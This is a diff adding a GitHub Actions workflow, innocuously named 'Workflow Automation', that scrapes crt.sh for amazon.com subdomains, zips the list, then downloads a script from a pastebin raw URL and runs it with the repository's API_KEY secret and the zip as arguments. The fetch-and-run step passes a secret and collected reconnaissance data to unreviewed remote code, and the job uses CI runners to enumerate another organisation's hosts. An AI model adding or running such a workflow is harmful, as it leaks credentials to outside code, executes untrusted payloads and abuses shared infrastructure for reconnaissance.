@@ -1,0 +1,44 @@
+name: Workflow Automation
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+
+jobs:
+  automate-task:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Create output directory
+      run: mkdir -p /root/output
+
+    - name: Update system packages
+      run: sudo apt update -y
+
+    - name: Install required packages
+      run: |
+        sudo apt install -y curl jq python3 zip pip
+        python3 -m pip install --break-system-packages requests
+
+    - name: Fetch CRT data
+      run: |
+        curl -s "https://crt.sh/?q=amazon.com&output=json" | \
+        jq -r '.[].name_value' | \
+        grep -Po '(\w+\.\w+\.\w+)$' | \
+        sort -u > /root/output/out.txt
+
+    - name: Zip the output
+      run: zip -r win3.zip /root/output/out.txt
+
+    - name: Download script.py
+      run: curl https://pastebin.com/raw/Au0i8d7F > script.py
+
+    - name: Execute Python script
+      env:
+        API_KEY: ${{ secrets.API_KEY }}
+      run: python3 script.py $API_KEY hamid1dev101 hamidaqq win3.zip
